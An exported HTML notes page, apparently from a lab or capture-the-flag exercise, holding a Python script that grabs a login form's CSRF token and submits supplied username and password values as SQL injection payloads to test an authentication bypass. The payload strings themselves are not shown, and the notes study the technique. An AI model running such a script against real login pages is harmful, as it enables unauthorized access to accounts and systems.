<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>SCRIPT</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>SCRIPT</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python3</span><br /><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;re<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;<span style="color:#333333;font-weight:400">termcolor</span>&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;colored<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;<span style="color:#333333;font-weight:400">bs4</span>&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;BeautifulSoup<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;urllib3<br /><br />urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br /><br /><br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">4</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;./script&nbsp;&lt;url&gt;&nbsp;&lt;payload-username&gt;&nbsp;&lt;payload-password&gt;&quot;</span>)<br />	sys.exit()<br /><br />url&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br />pay_username&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br />pay_password&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">3</span>]<br />browser&nbsp;=&nbsp;requests.session()<br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Getting&nbsp;CSRF&nbsp;Token</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Yeah&nbsp;First&nbsp;I&nbsp;was&nbsp;going&nbsp;to&nbsp;use&nbsp;Regex&nbsp;{its&nbsp;just&nbsp;So&nbsp;Dope}&nbsp;but&nbsp;then&nbsp;thought&nbsp;lets&nbsp;Just&nbsp;refresh&nbsp;some&nbsp;BeautifulSoup&nbsp;Have&nbsp;not&nbsp;Done&nbsp;it&nbsp;since&nbsp;very&nbsp;long</span><br /><span style="color:#ff9d00;font-weight:700">print</span>(colored(<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Trying&nbsp;to&nbsp;get&nbsp;CSRF&nbsp;Token&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;green&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br /><span style="color:#ff9d00;font-weight:700">try</span>:<br />	req_data&nbsp;=&nbsp;browser.get(f<span style="color:#3ad900;font-weight:400">&#39;{url}&#39;</span>,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br />	parsed_html&nbsp;=&nbsp;BeautifulSoup(req_data.content,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;html.parser&#39;</span>)<br />	token_csrf&nbsp;=&nbsp;parsed_html.find(<span style="color:#3ad900;font-weight:400">&quot;input&quot;</span>)[<span style="color:#3ad900;font-weight:400">&#39;value&#39;</span>]<br /><span style="color:#ff9d00;font-weight:700">except</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>(colored(f<span style="color:#3ad900;font-weight:400">&quot;\n[!]&nbsp;Unable&nbsp;to&nbsp;Get&nbsp;CSRF-token&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;red&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br /><br />post_data&nbsp;=&nbsp;{<span style="color:#3ad900;font-weight:400">&#39;csrf&#39;</span>:&nbsp;f<span style="color:#3ad900;font-weight:400">&#39;{token_csrf}&#39;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;username&#39;</span>:&nbsp;f<span style="color:#3ad900;font-weight:400">&#39;{pay_username}&#39;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;password&#39;</span>:&nbsp;f<span style="color:#3ad900;font-weight:400">&#39;{pay_password}&#39;</span>}<br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Post&nbsp;Data....&quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>(post_data)<br /><br /><span style="color:#ff9d00;font-weight:700">try</span>:<br />	resp&nbsp;=&nbsp;browser.post(f<span style="color:#3ad900;font-weight:400">&quot;{url}&quot;</span>,&nbsp;post_data,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br />	<span style="color:#ff9d00;font-weight:700">print</span>(colored(<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Post&nbsp;Request&nbsp;Successfull&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;green&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Log&nbsp;out&quot;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;resp.text:<br />		<span style="color:#0088ff;font-weight:400">#resp.status_code&nbsp;==&nbsp;302:</span><br />		&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(colored(<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Injection&nbsp;was&nbsp;Successfull\n&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;green&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>(colored(f<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Injection&nbsp;was&nbsp;Unsuccessfull&nbsp;::&nbsp;got_code:&nbsp;{resp.status_code}\n&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;red&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br /><span style="color:#ff9d00;font-weight:700">except</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;\n[!]&nbsp;Something&nbsp;went&nbsp;wrong..\n&quot;</span>)<br /><br /><br /></div></div><br /><br /><br />Now Its time to Run the script<br /><a href=""><img src="images/12-1.png" alt="images/12-1.png" /></a><br /><br />The script seems to be working perfectly accordingly with the correct and incorrect sqli payloads<br /></div></body></html>